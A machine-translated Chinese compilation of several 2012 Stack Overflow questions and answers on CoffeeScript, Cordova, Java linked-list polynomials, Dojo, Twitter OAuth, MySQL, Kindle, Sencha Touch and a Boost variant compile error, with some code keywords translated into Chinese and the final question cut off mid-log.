# coffeescript - 咖啡脚本中参数内部的方法

> ID：12954692
> 
> 赞同：0
> 
> 时间：2012-10-18T12:29:18.263
> 
> 标签：coffeescript

谁能告诉我coffeescript不将该方法`drop视为另一个参数？

```
$('#id-calendar').fullCalendar
  纵横比：0.5
  可编辑：真
  可丢弃：真
  默认视图：'议程周'
  时隙分钟：120
  分钟时间：8
  最大时间：20
  第一天：开始日期（）
  drop = (date, allDay, jsEvent, ui) ->
    控制台日志（日期）
    console.log(allDay)
    控制台日志（jsEvent）
    控制台.log(ui)
    originalEventObject = $(this).data('eventObject')
    复制的EventObject = $.extend({}, originalEventObject)
    复制的EventObject.start = 日期
    复制的EventObject.allDay = allDay
    $('#id-calendar').fullCalendar('renderEvent', 复制的EventObject, true)
    $(this).remove()
    返回真

```

输出是：

```
变种下降;

$(文档).ready(函数() {
  变量开始日期；
  开始日期 = 函数（） {
    var 日，今天；
    今天=新日期（）；
    day = today.getDay();
    切换（第 2 天）{
      情况1：
        返回 6；
      案例-2：
        返回 5；
      默认：
        返回日 - 2；
    }
  };
  return $('#external-events div.external-event').each(function() {
    var 事件对象；
    事件对象 = {
      标题：$.trim($(this).text())
    };
    $(this).data('eventObject', eventObject);
    返回 $(this).draggable({
      z索引：999，
      埃弗特：真的，
      恢复时间：0
    });
  });
});

$('#id-calendar').fullCalendar({
  纵横比：0.5，
  可编辑：真，
  可丢弃：真实，
  defaultView: 'agendaWeek',
  slotMinutes: 120,
  分钟时间：8，
  最大时间：20，
  第一天：开始日期（）
}, drop = function(date, allDay, jsEvent, ui) { === BUG
  var 复制的事件对象，原始事件对象；
  控制台日志（日期）；
  console.log(allDay);
  控制台.log(jsEvent);
  控制台.log(ui);
  originalEventObject = $(this).data('eventObject');
  复制的EventObject = $.extend({}, originalEventObject);
  复制的EventObject.start = 日期；
  复制的EventObject.allDay = allDay;
  $('#id-calendar').fullCalendar('renderEvent', 复制的EventObject, true);
  $(this).remove();
  返回真；
});

```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T13:05:03.223

它应该是

```
drop: (date, allDay, jsEvent, ui) -> 
```

而不是`drop =`。

# xcode - Cordova 2.1.0 magtek idynamo sdk

> ID：12954695
> 
> 赞同：2
> 
> 时间：2012-10-18T12:29:28.533
> 
> 标签：xcode, cordova, ios6

我们将 cordova 从 1.6.1 升级到 2.1.0 以及 iOS6。现在我们遇到重复符号错误。这是我的问题[iOS6 的链接：xcode 4.5 中的重复符号错误](https://stackoverflow.com/questions/12738435/ios6-duplicate-symbol-error-in-xcode-4-5)

我尝试降级科尔多瓦。在 2.0.0 上仍然有同样的问题，但是当我降级到 1.9.0 时它工作正常。根据我最初的研究，我发现问题可能是由 cordova 的新 Xcode 项目模板引起的。从 1.6.1 到 1.9.0，必须从 xcode 应用程序创建新项目，但在 2.0.0 到 2.1.0 中，项目是通过命令行创建的。有人可以帮我解释一下吗？谢谢

# java - 使用节点类乘以多项式

> ID：12954701
> 
> 赞同：0
> 
> 时间：2012-10-18T12:29:42.100
> 
> 标签：java

我已经创建了一个数据结构来使用本地节点类来重复多项式。我有方法可以加减两个长度为 n 的多项式。我正在尝试添加一个乘法方法，它将返回两个多项式的乘积。我几乎完成了这个问题。此时，我正在尝试创建第三个链表（使用 Node 类）以存储和返回两个多项式的乘积。我的问题只是编码这个解决方案。我收到空指针异常。

这是我的 Node 类的完整代码：

```
 public class Node{

//Fields
public int data1;
public int data2;
public Node next;

//constructors
public Node(){
    data1 = 0;
    data2 = 0;
    next = null;
}

public Node(int d1){
    data1 = d1;
    data2 = 0;
    next = null;
}

public Node(int d1, Node n){
    data1 = d1;
    data2 = 0;
    next = n;
}

public Node(int d1, int d2){
    data1 = d1;
    data2 = d2;
    next = null;
}
public Node(int d1,int d2, Node n){
    data1 = d1;
    data2 = d2;
    next = n;
}

//Methods

//Fetch data
public int getData1(){
    return data1;
}

public int getData2(){
    return data2;
}

//store Data
public void setData1(int d){
    data1 = d;
}

public void setData2(int d){
    data2 = d;
}

public int addData1(Node n2){
    data1 = data1 + n2.data1;
    return data1;
}

public int addData2(Node n2){
    data2 = data2 + n2.data2;
    return data2;
}

public void subData1(Node n2){
    data1 = data1 - n2.data1;
}

public int multiplyData1(Node n2){
    data1 = data1*n2.data1;
    return data1;
}

//getNext
public Node getNext(){
    return next;
}

//Get data of next node
public int getNextData1(){
    return next.data1;
}

public int getNextData2(){
    return next.data2;
}

//Store Link
public void setNext(Node n){
    next = n;
}

public boolean containsLink(){
    if(this.next != null){
        return true;
    }else{
        return false;
    }
}

public static void displayAll(Node head){
    for( ; head != null; head = head.next ){
        System.out.printf("%d, %d\n", head.data1, head.data2);
    }
}

public static int numOfNonZeroData1(Node n){
    int count = 0; 
    for( ; n != null ; n = n.next ){
        if(n.data1 != 0){
            count++;
        }
    }
    return count;
}

public static int numOfNonZeroData2(Node n){
    int count = 0; 
    for( ; n != null ; n = n.next ){
        if(n.data2 != 0){
            count++;
        }
    }
    return count;
}

public static int listLength(Node head){
    int counter = 0;
    for(; head!=null; head = head.next){
        counter++;
    }
    return counter;
}

//copy list [Recursive method found on website StackOverflow.com]
public Node copyData1( Node p ) {
    if( p == null )
        return null; 
    else 
        return new Node(p.data1, copyData1(p.next)); 
}

public Node copyData2( Node p ) {
    if( p == null )
        return null; 
    else 
        return new Node(p.data2, copyData2(p.next)); 
}

//===============================================================

public static void toPolynomial(Node head){
    int order = Node.listLength(head);
    int i = 0;
    int increment = Node.numOfNonZeroData2(head);
    for( ; head != null; head = head.next){
        if(head.data2 != 0 && head.data1 != 0){
            if(i >= 0 && i < order){
                System.out.printf("%dx^%d", head.data1, head.data2);
                i++;
                if(i < increment && head.data1 >= 0){
                    System.out.print("+");      //case integer is positive
                }else if(i != increment && head.data1 <= 0){
                    System.out.println(" ");    //case integer is negative
                }
            }

        }
    }
    System.out.println();
}

public static Node mergeLists(Node n1, Node n2){
    if ( n1 == null) 
        return n2;
    else if ( n2 == null) 
        return n1;
    else {
        n1.next = mergeLists( n1.next, n2 );   
        return n1;
    }
}

public static Node addPolynomials(Node n1, Node n2) {
    Node x = n1;
    Node y = n2;
    for(x = n1; x != null; x = x.next){
        for(y = n2; y != null; y = y.next){
            if(x.getData2() == y.getData2()){
                x.addData1(y);
                System.out.println("Added " + (x.data1 - y.data1) + " and " + y.data1);
            }

        }
    }
    System.out.println("Add completed");
    return x;
}

public static Node subtractPolynomials(Node n1, Node n2){
    Node x = n1;
    Node y = n2;
    for(x = n1; x != null; x = x.next){
        for(y = n2; y != null; y = y.next){
            if(x.getData2() == y.getData2()){
                x.subData1(y);
                System.out.println("Subtracted " + (x.data1 - y.data1) + " and " + y.data1);
            }

        }
    }
    System.out.println("Subtract completed");
    return x;
}

public static Node multiplyPolynomials(Node n1, Node n2){

    Node x = n1;
    Node y = n2;
    Node z = new Node();
    for(x = n1; x != null; x = x.next){
        for(y = n2; y != null; y = y.next){
            z.data1 = x.multiplyData1(y); // error is here
            z.data2 = x.addData2(y);
            //System.out.println("Multiplied " + (x.data1 - y.data1) + " and " + y.data1);
            z = z.next;
        }
    }
    System.out.println("Multiplication completed");
    return x;
} 
```

}

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:50:58.760

请看这个部分：

```
**Node z = new Node();**
for(x = n1; x != null; x = x.next){
    for(y = n2; y != null; y = y.next){
        z.data1 = x.multiplyData1(y);
        z.data2 = x.addData2(y);
        //System.out.println("Multiplied " + (x.data1 - y.data1) + " and " + y.data1);
        **z = z.next;**
    }
} 
```

您正在迭代任意长度的节点列表，但新的 z 节点的长度为 1。您需要在进行过程中将节点添加到 z。就像是：

```
z.next = new Node();
z = z.next; 
```

# ios5 - dojo是否需要保留所有.js文件

> ID：12954703
> 
> 赞同：0
> 
> 时间：2012-10-18T12:29:44.757
> 
> 标签：ios5, xcode4.3, dojo, dojox.mobile

我在 iPhone 中为 UI 使用 dojo。我已经完全复制了 dojo、dojox 文件夹，并且在 Xcode 中编译需要花费大量时间。

如果我只保留所需的 .js 文件可以吗？

例如

```
 require(["dojox/mobile/parser", "dijit/registry", "dojox/mobile",  "dojox/mobile/SwapView", "dojox/mobile/TabBar",  "dojox/mobile/Button","dojox/mobile/deviceTheme", "dojox/mobile/compat", "dojo/domReady!"],function(parser) {
                parser.parse();
            }); 
```

可以只在 require 函数中包含与上面包含的模块相关的 .js 文件吗？

好心劝告。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T15:43:53.167

您将需要保留所有这些文件以及它们所依赖的所有文件，*然后*是**它们所**依赖的文件......依赖关系一直向下。

阅读[Dojo 构建系统](http://dojotoolkit.org/reference-guide/1.8/build/)。这将允许您构建一个仅包含您需要的 Dojo 文件而没有其他内容的文件。它还会为您缩小它。这会减少请求数量和当您拉入 JavaScript 时发送的数据总量。

# twitter - 发送直接消息或获取响应时出错

> ID：12954704
> 
> 赞同：0
> 
> 时间：2012-10-18T12:29:47.000
> 
> 标签：twitter, twitter-oauth

我正在使用“InMemoryTokenManager”从我的应用程序发送消息。

方法“auth.BeginAuthorize();” 将异常返回为“发送直接消息或获取响应时发生错误。”。有人可以帮我解决这个问题。

Thx-萨蒂亚

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-13T09:34:04.860

至于我，由于两次检查授权而弹出。删除第二个检查授权的调用后，它开始正常工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-06T21:20:12.267

当您在 Twitter 应用程序中未正确设置返回 URL 时，可能会看到此错误消息，登录 Twitter 后可在此处找到：[https ://dev.twitter.com/apps](https://dev.twitter.com/apps)

# mysql - mysql避免子查询

> ID：12954709
> 
> 赞同：1
> 
> 时间：2012-10-18T12:29:54.660
> 
> 标签：mysql, sql

如果我有一个三列的表

```
用户 ID，事件 ID，进入时间

```

和价值观

```

`userid,eventid,entrytime
  1      1      NULL
  2      1    2012-01-01
  1      2    2012-01-01
  2      2    2012-01-01
  3      1      NULL
  3      2      NULL` 

选择 entrytime 始终为 NULL 的用户 ID 的最佳方法是什么

            回答 #1

赞同：4

时间：2012-10-18T12:32:33.630

由于聚合将消除 NULL 值，因此您可以通过将其与子句中的 0 进行比较`COUNT(entrytime)`来确定哪个`userid`没有非空值。`entrytime``HAVING`

```
SELECT userid, COUNT(entrytime)
FROM yourtable
GROUP BY userid
HAVING COUNT(entrytime) = 0 
```

[这是一个现场演示](http://sqlfiddle.com/#!2/e4a4a/1)（结果为`userid`= 3）

            回答 #2

赞同：3

时间：2012-10-18T12:55:49.967

试试这个：

```
select userid from
(select userid,entrytime,count(*) from yourtable 
group by userid,entrytime)a
group by userid
having count(*)=1 and max(entrytime) is null 
```

[SQL 小提琴演示](http://sqlfiddle.com/#!2/e4a4a/9)

            回答 #3

赞同：1

时间：2012-10-18T12:40:52.673

```
SELECT DISTINCT t1.UserId
FROM <TableName> t1
    LEFT JOIN <TableName> t2 ON t1.UserID = t2.UserID AND t2.EntryTime IS NOT NULL
WHERE t2.UserID IS NULL 
```

            回答 #4

赞同：-1

时间：2012-10-18T12:32:07.997

```
 select userid from table_name  where entrytime is null 
```

```

# kindle - 将 HTML5 webview 加载到应用程序中

> ID：12954710
> 
> 赞同：1
> 
> 时间：2012-10-18T12:29:56.190
> 
> 标签：kindle, kindle-kdk

我没有使用 Kindle KDK 的经验，所以也许这是一个无聊的问题。我在想。是否可以创建一个加载 webview 的简单应用程序？所以我们可以很容易地“包装”一个现有的产品。

如果是这样，我对以下可能性感兴趣：

*   它目前使用什么引擎（如 WebKit）
*   它是否具有 HTML5 功能，例如 Web 存储和应用程序缓存
*   JavaScript 性能有多好

我在 Wikipedia 上发现它使用“ [[...] 一个基于实验性 WebKit 的浏览器 [...]](http://en.wikipedia.org/wiki/WebKit#Ports) ”，但它能够做什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-19T22:14:38.917

不幸的是，KDK 无法访问 Webview（如 Android 或 iOS），因此您无法加载任何网页内容或使用任何 HTML 5 功能。WebKit 浏览器只是用于网上冲浪的内置浏览器。

# sencha-touch - Sencha Touch 浏览器-导航返回按钮

> ID：12954716
> 
> 赞同：3
> 
> 时间：2012-10-18T12:30:22.217
> 
> 标签：sencha-touch, back-button

如何覆盖浏览器后退按钮的功能？我在页面中有导航视图，我想同步浏览器后退按钮和导航视图的后退按钮。我可以覆盖导航按钮的功能，但我不知道如何为浏览器做同样的事情。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T19:36:09.413

您必须使用路由，本教程将向您展示如何使用：[http ://railsdevtricksofthetrade.blogspot.com/2012/04/sencha-touch-2-routes-and-back-button.html?m=1](http://railsdevtricksofthetrade.blogspot.com/2012/04/sencha-touch-2-routes-and-back-button.html?m=1)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-26T22:32:45.130

我设法用以下代码覆盖了导航视图的后退按钮

1.  在您的控制器中，创建一个新的`ref`：

    ```
    backToNav: 'myNavXtypeName button[text=Back]' 
    ```

2.  在同一个控制器中，将 ref 链接到 a `control`：

    ```
    backToNav: {
            tap: 'backToNav'
    } 
    ```

3.  最后创建实现导航视图弹出功能的控制器方法。

    ```
    backToNav: function() {
            Ext.getCmp('myNavXtypeName').pop()
    } 
    ```

完毕。 [在此处阅读有关参考和控件的更多信息](http://docs.sencha.com/touch/2.4/core_concepts/controllers.html)

# c++ - Boost::variant 无法解析 std::ostream 的 operator<<

> ID：12954718
> 
> 赞同：3
> 
> 时间：2012-10-18T12:30:27.687
> 
> 标签：c++, boost, boost-variant

我真的不明白发生了什么。我正在使用 MSVC 2012，Boost 51。这段代码应该可以正常工作，但它没有被编译：

```
#include "stdafx.h"
#include <string>
#include <boost/variant/recursive_variant.hpp>

namespace NsSemSDK
{

struct STreeConstructionRuleRegexp {
    std::string m_strEntity;
};

struct STreeConstructionRuleString {
    std::string m_strEntity;
};

struct STreeConstructionRuleIdentifier {
    std::string m_strEntity;
};

typedef int STreeConstructionRuleNumber;

typedef boost::variant<STreeConstructionRuleRegexp, STreeConstructionRuleNumber> STreeConstructionRuleOperand; // STreeConstructionRuleString, STreeConstructionRuleIdentifier

}

std::ostream& operator<<(std::ostream& stream, const NsSemSDK::STreeConstructionRuleRegexp& val)
{
    return stream << '\'' << val.m_strEntity << '\'';
}

std::ostream& operator<<(std::ostream& stream, const NsSemSDK::STreeConstructionRuleString& val)
{
    return stream << '"' << val.m_strEntity << '"';
}

std::ostream& operator<<(std::ostream& stream, const NsSemSDK::STreeConstructionRuleIdentifier& val)
{
    return stream << val.m_strEntity;
}

using namespace NsSemSDK;

int _tmain(int argc, _TCHAR* argv[])
{
    STreeConstructionRuleNumber num = 1024;
    STreeConstructionRuleOperand operand = num;
    std::cout << operand << std::endl;
} 
```

我得到的是：

```
1>------ Build started: Project: ConsoleApplication3, Configuration: Debug Win32 ------
1>  Source.cpp
1>c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\boost\variant\detail\variant_io.hpp(64): error C2679: binary '<<' : no operator found which takes a right-hand operand of type 'const T0' (or there is no acceptable conversion)
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(695): could be 'std::basic_ostream<_Elem,_Traits> &std::operator <<<char,std::char_traits<char>>(std::basic_ostream<_Elem,_Traits> &,const char *)' [found using argument-dependent lookup]
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(742): or       'std::basic_ostream<_Elem,_Traits> &std::operator <<<char,std::char_traits<char>>(std::basic_ostream<_Elem,_Traits> &,char)' [found using argument-dependent lookup]
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(780): or       'std::basic_ostream<_Elem,_Traits> &std::operator <<<std::char_traits<char>>(std::basic_ostream<_Elem,_Traits> &,const char *)' [found using argument-dependent lookup]
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(827): or       'std::basic_ostream<_Elem,_Traits> &std::operator <<<std::char_traits<char>>(std::basic_ostream<_Elem,_Traits> &,char)' [found using argument-dependent lookup]
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(953): or       'std::basic_ostream<_Elem,_Traits> &std::operator <<<std::char_traits<char>>(std::basic_ostream<_Elem,_Traits> &,const signed char *)' [found using argument-dependent lookup]
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(960): or       'std::basic_ostream<_Elem,_Traits> &std::operator <<<std::char_traits<char>>(std::basic_ostream<_Elem,_Traits> &,signed char)' [found using argument-dependent lookup]
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(967): or       'std::basic_ostream<_Elem,_Traits> &std::operator <<<std::char_traits<char>>(std::basic_ostream<_Elem,_Traits> &,const unsigned char *)' [found using argument-dependent lookup]
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(974): or       'std::basic_ostream<_Elem,_Traits> &std::operator <<<std::char_traits<char>>(std::basic_ostream<_Elem,_Traits> &,unsigned char)' [found using argument-dependent lookup]
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(984): or       'std::basic_ostream<_Elem,_Traits> &std::operator <<<char,std::char_traits<char>,T>(std::basic_ostream<_Elem,_Traits> &&,const _Ty &)' [found using argument-dependent lookup]
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>,
1>              T=T0,
1>              _Ty=T0
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(1101): or       'std::basic_ostream<_Elem,_Traits> &std::operator <<<char,std::char_traits<char>>(std::basic_ostream<_Elem,_Traits> &,const std::error_code &)' [found using argument-dependent lookup]
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\boost\blank.hpp(93): or       'std::basic_ostream<_Elem,_Traits> &boost::operator <<<char,std::char_traits<char>>(std::basic_ostream<_Elem,_Traits> &,const boost::blank &)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(201): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(std::basic_ostream<_Elem,_Traits> &(__cdecl *)(std::basic_ostream<_Elem,_Traits> &))'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(207): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(std::basic_ios<_Elem,_Traits> &(__cdecl *)(std::basic_ios<_Elem,_Traits> &))'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(214): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(std::ios_base &(__cdecl *)(std::ios_base &))'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(221): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(std::_Bool)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(241): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(short)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(275): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(unsigned short)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(295): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(int)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(320): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(unsigned int)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(340): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(long)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(360): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(unsigned long)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(381): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(__int64)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(401): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(unsigned __int64)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(422): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(float)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(442): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(double)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(462): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(long double)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(482): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(const void *)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\program files (x86)\microsoft visual studio 11.0\vc\include\ostream(502): or       'std::basic_ostream<_Elem,_Traits> &std::basic_ostream<_Elem,_Traits>::operator <<(std::basic_streambuf<_Elem,_Traits> *)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          while trying to match the argument list '(std::basic_ostream<_Elem,_Traits>, const T0)'
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>
1>          ]
1>          c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\boost\variant\variant.hpp(859) : see reference to function template instantiation 'void boost::detail::variant::printer<OStream>::operator ()<const T>(const T &) const' being compiled
1>          with
1>          [
1>              OStream=std::basic_ostream<char,std::char_traits<char>>,
1>              T=T0
1>          ]
1>          c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\boost\variant\variant.hpp(859) : see reference to function template instantiation 'void boost::detail::variant::printer<OStream>::operator ()<const T>(const T &) const' being compiled
1>          with
1>          [
1>              OStream=std::basic_ostream<char,std::char_traits<char>>,
1>              T=T0
1>          ]
1>          c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\boost\variant\detail\visitation_impl.hpp(130) : see reference to function template instantiation 'void boost::detail::variant::invoke_visitor<Visitor>::internal_visit<const T>(T &,int)' being compiled
1>          with
1>          [
1>              Visitor=boost::detail::variant::printer<std::basic_ostream<char,std::char_traits<char>>>,
1>              T=T0
1>          ]
1>          c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\boost\variant\detail\visitation_impl.hpp(130) : see reference to function template instantiation 'void boost::detail::variant::invoke_visitor<Visitor>::internal_visit<const T>(T &,int)' being compiled
1>          with
1>          [
1>              Visitor=boost::detail::variant::printer<std::basic_ostream<char,std::char_traits<char>>>,
1>              T=T0
1>          ]
1>          c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\boost\variant\detail\visitation_impl.hpp(173) : see reference to function template instantiation 'void boost::detail::variant::visitation_impl_invoke_impl<Visitor,VoidPtrCV,T>(int,Visitor &,VoidPtrCV,T *,boost::mpl::true_)' being compiled
1>          with
1>          [
1>              Visitor=boost::detail::variant::invoke_visitor<boost::detail::variant::printer<std::basic_ostream<char,std::char_traits<char>>>>,
1>              VoidPtrCV=const void *,
1>              T=T0
1>          ]
1>          c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\boost\variant\detail\visitation_impl.hpp(256) : see reference to function template instantiation 'void boost::detail::variant::visitation_impl_invoke<Visitor,VoidPtrCV,T0,NoBackupFlag>(int,Visitor &,VoidPtrCV,T *,NoBackupFlag,int)' being compiled
1>          with
1>          [
1>              Visitor=boost::detail::variant::invoke_visitor<boost::detail::variant::printer<std::basic_ostream<char,std::char_traits<char>>>>,
1>              VoidPtrCV=const void *,
1>              NoBackupFlag=boost::variant<NsSemSDK::STreeConstructionRuleRegexp,NsSemSDK::STreeConstructionRuleNumber>::has_fallback_type_,
1>              T=T0
1>          ]
1>          c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\boost\variant\variant.hpp(1803) : see reference to function template instantiation 'void boost::detail::variant::visitation_impl<first_which,first_step,Visitor,VoidPtrCV,boost::variant<T0_,T1>::has_fallback_type_>(const int,const int,Visitor &,VoidPtrCV,boost::mpl::false_,NoBackupFlag,Which *,step0 *)' being compiled
1>          with
1>          [
1>              Visitor=boost::detail::variant::invoke_visitor<boost::detail::variant::printer<std::basic_ostream<char,std::char_traits<char>>>>,
1>              VoidPtrCV=const void *,
1>              T0_=NsSemSDK::STreeConstructionRuleRegexp,
1>              T1=NsSemSDK::STreeConstructionRuleNumber,
1>              NoBackupFlag=boost::variant<NsSemSDK::STreeConstructionRuleRegexp,NsSemSDK::STreeConstructionRuleNumber>::has_fallback_type_,
1>              Which=first_which,
1>              step0=first_step
1>          ]
1>          c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\boost\variant\variant.hpp(1825) : see reference to function template instantiation 'void boost::variant<T0_,T1>::internal_apply_visitor_impl<Visitor,const void*>(int,int,Visitor &,VoidPtrCV)' being compiled
1>          with
1>          [
1>              T0_=NsSemSDK::STreeConstructionRuleRegexp,
1>              T1=NsSemSDK::STreeConstructionRuleNumber,
1>              Visitor=boost::detail::variant::invoke_visitor<boost::detail::variant::printer<std::basic_ostream<char,std::char_traits<char>>>>,
1>              VoidPtrCV=const void *
1>          ]
1>          c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\boost\variant\variant.hpp(1825) : see reference to function template instantiation 'void boost::variant<T0_,T1>::internal_apply_visitor_impl<Visitor,const void*>(int,int,Visitor &,VoidPtrCV)' being compiled
1>          with
1>          [
1>              T0_=NsSemSDK::STreeConstructionRuleRegexp,
1>              T1=NsSemSDK::STreeConstructionRuleNumber,
1>              Visitor=boost::detail::variant::invoke_visitor<boost::detail::variant::printer<std::basic_ostream<char,std::char_traits<char>>>>,
1>              VoidPtrCV=const void *
1>          ]
1>          c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\boost\variant\variant.hpp(1847) : see reference to function template instantiation 'void boost::variant<T0_,T1>::internal_apply_visitor<boost::detail::variant::invoke_visitor<Visitor>>(boost::detail::variant::invoke_visitor<Visitor> &) const' being compiled
1>          with
1>          [
1>              T0_=NsSemSDK::STreeConstructionRuleRegexp,
1>              T1=NsSemSDK::STreeConstructionRuleNumber,
1>              Visitor=boost::detail::variant::printer<std::basic_ostream<char,std::char_traits<char>>>
1>          ]
1>          c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\boost\variant\variant.hpp(1847) : see reference to function template instantiation 'void boost::variant<T0_,T1>::internal_apply_visitor<boost::detail::variant::invoke_visitor<Visitor>>(boost::detail::variant::invoke_visitor<Visitor> &) const' being compiled
1>          with
1>          [
1>              T0_=NsSemSDK::STreeConstructionRuleRegexp,
1>              T1=NsSemSDK::STreeConstructionRuleNumber,
1>              Visitor=boost::detail::variant::printer<std::basic_ostream<char,std::char_traits<char>>>
1>          ]
